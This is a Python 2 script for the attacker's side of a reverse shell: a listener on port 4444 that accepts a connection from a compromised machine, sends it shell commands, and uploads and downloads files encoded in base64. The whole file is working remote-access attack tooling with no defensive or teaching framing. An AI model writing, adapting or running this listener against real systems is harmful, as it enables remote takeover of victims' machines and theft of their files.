import socket
import json
import base64

class Listener:
    def __init__( self, ip, port ):
        listener = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
        listener.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 )
        listener.bind( ( ip, port ) )
        listener.listen( 0 )
        print( "[+] waiting for the incomming connections" )
        self.connection, address = listener.accept()
        print( "[+] new connection from " + str( address ) )
    
    def reliable_send( self, data ):
        json_data = json.dumps( data )
        self.connection.send( json_data )

    def reliable_receive( self ):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv( 1024 )
                return json.loads( json_data )
            except ValueError:
                continue

    def send_cmd( self, cmd ):
        self.reliable_send( cmd )
        if cmd[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file( self, path, content ):
        with open( path, "wb") as file:
            file.write( base64.b64decode( content ) )
            return "[+] download successful" 

    def read_file( self, path ):
        with open( path, "rb" ) as file:
            return base64.b64encode( file.read() )


    def main( self ):
        while True:
            cmd = raw_input( " >> " )
            cmd = cmd.split( " " )

            try:
                if cmd[0] == "upload":
                    file_content = self.read_file( cmd[1] )
                    cmd.append( file_content )

                res = self.send_cmd( cmd )
                if cmd[0] == "download" and "[-] Error " not in res:
                    res = self.write_file( cmd[1], res )
            except Exception:
                res = "[-] Error during cmd execution."
            print(  res )

listener = Listener( "ip here", 4444 )
listener.main()